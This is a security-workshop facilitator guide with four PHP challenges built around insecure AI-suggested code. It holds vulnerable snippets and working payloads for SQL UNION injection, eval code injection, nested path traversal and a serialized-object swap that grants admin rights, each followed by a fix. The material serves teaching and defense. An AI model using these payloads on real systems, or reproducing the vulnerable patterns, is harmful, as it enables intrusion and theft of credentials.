# Hack, Fix, Discuss! - Facilitator Guide (AI Security Edition)

This guide contains the solutions (attacks) and best practices (fixes) for the AI-themed security challenges in the workshop.

---

## Challenge 1: The Copilot's Query (SQL Injection)

### The Vulnerability
An AI assistant suggested a custom filter (`str_replace`) to "secure" the query. However, it only filtered single quotes, which are not used in this numeric-based query.

```php
$userId = str_replace("'", "", $userId);
$query = "SELECT username FROM users WHERE id = " . $userId;
```

### Attack (Team Hack)
Since the input is concatenated without quotes, we don't need quotes to break out of the string. We can use a `UNION SELECT` directly. However, the "AI filter" removes single quotes, so we must avoid them in our subquery.

**Possible Payload:**
```text
0 UNION SELECT config_value FROM system_config
```
*Why it works:* Since the `system_config` table only has one row (the admin password), we don't even need a `WHERE` clause. This bypasses the quote filter entirely. If you needed a specific row, you could use `LIMIT 1 OFFSET 0`.

### Fix (Team Blue)
AI often suggests "hand-rolled" filters. Always use **Prepared Statements**.

**The Correct Fix:**
```php
$stmt = $db->prepare("SELECT username FROM users WHERE id = :id");
$stmt->execute(['id' => $userId]);
```

---

## Challenge 2: The Insecure AI Agent (Prompt Injection / RCE)

### The Vulnerability
The "AI Agent" uses `preg_match` to parse a command and then `eval()` to execute the result. It has a naive filter for the word "flag".

```php
eval("echo " . $expression . ";");
```

### Attack (Team Hack)
This is a **Prompt Injection** attack. We need to escape the intended command and execute our own code, while bypassing the "flag" filter.

**Possible Payloads:**
1.  **Completion Bypass:** `Calculate 1; $f='fla'.'g'; echo $$f`
2.  **Complex Expression:** `Calculate ${'fla'.'g'}`
3.  **Globals Array:** `Calculate $GLOBALS['fla'.'g']`

*Note:* Because the code is `eval("echo " . $expression . ";")`, your payload must either be a complete expression that `echo` can handle (like `${'fla'.'g'}`) or it must terminate the first `echo` with a semicolon and start a new statement.

### Fix (Team Blue)
Never pass AI-parsed strings to `eval()`.

**The Correct Fix:**
Avoid `eval()` entirely. If you must evaluate math, use a library like `math-parser` or a very strict regex whitelist:
```php
if (!preg_match('/^[0-9+\\-*\/(). ]+$/', $expression)) {
    die("Invalid characters");
}
```

---

## Challenge 3: The AI's "Smart" Sanitizer (Path Traversal)

### The Vulnerability
The AI suggested removing `../` once. This is a classic "recursive bypass" vulnerability.

```php
$page = str_replace("../", "", $page);
```

### Attack (Team Hack)
Use nested traversal strings.

**Possible Payload:**
```text
....//config
```
*Process:* `str_replace` removes the middle `../`, leaving the outer `../` intact.

### Fix (Team Blue)
AI-generated filters are often incomplete. Use `basename()`.

**The Correct Fix:**
```php
$page = basename($page); 
```

---

## Challenge 4: The AI-Recommended Library (Insecure Deserialization)

### The Vulnerability
The AI recommended using `unserialize()` for "performance" over JSON.

### Attack (Team Hack)
Swap the `GuestProfile` object with an `AdminProfile` object in the serialized string.

**Attack Payload:**
`O:4:"User":1:{s:7:"profile";O:12:"AdminProfile":0:{}}`

### Fix (Team Blue)
Don't follow AI advice that prioritizes performance over security. Use JSON.

**The Correct Fix:**
```php
$userData = json_decode($data, true);
```
